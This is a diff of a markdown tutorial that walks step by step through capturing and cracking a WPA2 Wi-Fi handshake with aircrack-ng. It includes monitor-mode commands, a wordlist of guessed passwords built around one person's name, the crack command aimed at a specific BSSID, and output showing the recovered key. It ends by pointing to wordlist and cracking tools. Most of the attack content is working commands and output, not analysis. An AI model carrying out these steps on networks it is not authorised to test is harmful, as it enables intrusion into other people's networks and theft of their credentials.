@@ -5,6 +5,7 @@ A step-by-step walkthrough for capturing and cracking WPA2 Wi-Fi handshakes usin
 
 ---
 
+
 ## 🔰 STEP 1: Show your current Wi-Fi interfaces
 
 ```bash
@@ -34,6 +35,8 @@ Edit
 
 ```
 
+
+
 ## 🛑 STEP 2: Stop Monitor Mode (to start fresh)
 ```bash
 sudo airmon-ng stop wlan0mon
@@ -50,6 +53,8 @@ phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 8
                 (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 ```
 
+
+
 ## 🚀 STEP 3: Start Monitor Mode
 ```bash
 sudo airmon-ng start wlan0
@@ -64,6 +69,8 @@ phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 8
                 (mac80211 station mode vif enabled on [phy0]wlan0)
                 (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 ```
+
+
 
 ## 📡 STEP 4: Scan for Nearby Wi-Fi Networks
 ```bash
@@ -196,10 +203,6 @@ echo -e "anki123456\nankith1234\nankith@2024\nAnkith123\nankithwifi\nankith321\n
 ```
 🔨 Crack Command
 ```bash
-aircrack-ng -w ankith_list.txt -b 3E:B7:E4:DD:3A:19 ankith_capture-01.cap
-```
-Or:
-```bash
 aircrack-ng -w ankith_list.txt -b 3E:B7:E4:DD:3A:19 ankith_capture-04.cap
 ```
 🧾 Sample Output
@@ -228,4 +231,29 @@ Transient Key  : E9 53 84 18 E3 D9 3B 7E 54 F7 81 5E EE 28 87 75
 
 EAPOL HMAC     : 81 C3 AD 1B 94 D1 CE C7 F6 6F 11 07 F1 0B CF 6D
 ```
+
+
 ✅ The suspected passwords list helped crack the key successfully.
+
+
+If you are smart enough, you'll understand why I created my own list and hardcoded the passwords into it before running aircrack-ng.
+
+If you understood till here, then further on you can refer the below tools to proceed 
+
+### 🔐 cewl 
+
+### 🔐 crunch 
+
+### 🔐 John the Ripper 
+
+Or 
+
+Alertnatively:
+
+### 📁 rockyou.txt
+
+### 📚 SecLists GitHub repo
+
+### 🔐 hashes.org 
+
+
